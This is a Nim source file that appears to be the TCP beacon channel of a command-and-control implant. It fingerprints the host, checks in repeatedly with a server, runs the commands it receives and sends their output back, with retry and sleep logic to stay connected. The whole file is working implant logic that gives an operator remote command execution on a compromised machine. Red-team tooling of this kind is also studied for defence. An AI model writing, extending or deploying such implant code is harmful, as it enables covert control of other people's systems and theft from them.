import std/strutils
import ../utils/global
import ../utils/network/tcp_core
import ../utils/network/relay_packet
import ../utils/tasks/utils as tasks
import ../utils/linapi/handlers
import ../utils/actions/fingerprint
import ../capabilities/sleep

proc returnOutput() =
  # Sends pending task output and retries until the server accepts it
  if not tasks.check_output():
    return
  var batch = tasks.get_output()
  var sent = sendBatch(batch)
  while not sent.ok:
    sleep_now()
    sendFingerprint()
    sent = sendBatch(batch)
  batch.setLen(0)
  if isMissingHostResponse(sent.body):
    sendFingerprint()
  tasks.clear_tasks(sent.ok, sent.body)

proc main*(): void =
  # Main loop of the tcp channel that retries the beacon, sends output and runs commands
  sendFingerprint()
  while true:
    var boot = sendRequest(hostTag)
    while not boot.ok:
      sleep_now()
      boot = sendRequest(hostTag)
    if boot.code == 200:
      break
    elif isMissingHostResponse(boot.body):
      sendFingerprint()
    sleep_now()

  while true:
    returnOutput()
    sleep_now()
    var resp = sendRequest(hostTag)
    while not resp.ok:
      sleep_now()
      sendFingerprint()
      resp = sendRequest(hostTag)
    if isMissingHostResponse(resp.body):
      sendFingerprint()
    elif hasCommands(resp):
      tasks.run_command(resp.body)
      returnOutput()
    if secondDelayEnabled:
      sleep_now(secondDelay)
      returnOutput()
